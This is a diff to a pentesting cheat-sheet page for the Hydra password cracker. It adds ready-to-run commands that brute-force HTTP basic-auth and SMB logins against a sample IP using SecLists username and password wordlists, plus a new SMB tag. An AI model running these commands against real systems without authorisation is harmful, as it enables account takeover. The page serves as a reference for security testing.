@@ -1,10 +1,19 @@
 ---
 title: Hydra
 desc: Cracks username and password in web form, SSH, FTP.
-tags: [Cryptography, FTP, Linux, Password, SSH]
+tags: [Cryptography, FTP, Linux, Password, SMB, SSH]
 alts: [CrackStation, Hashcat, JohnTheRipper]
 website:
 ---
+
+## HTTP GET request (Authorization, WWW-Authenticate)
+
+```sh
+# Crack username and password
+hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/seclists/Passwords/darkc0de.txt 10.0.0.1 http-get
+```
+
+<br />
 
 ## Web form
 
@@ -35,4 +44,16 @@ hydra -v -l username -P /usr/share/seclists/Passwords/darkc0de.txt 10.0.0.1 ssh
 ```sh
 # Crack password
 hydra -l username -P passwords.txt ftp://10.0.0.1
+```
+
+<br />
+
+## SMB
+
+```sh
+# Crack username
+hydra -v -L /usr/share/seclists/Usernames/Names/names.txt -p password 10.0.0.1 smb
+
+# Crack password
+hydra -v -l username -P /usr/share/seclists/Passwords/darkc0de.txt 10.0.0.1 smb
 ```
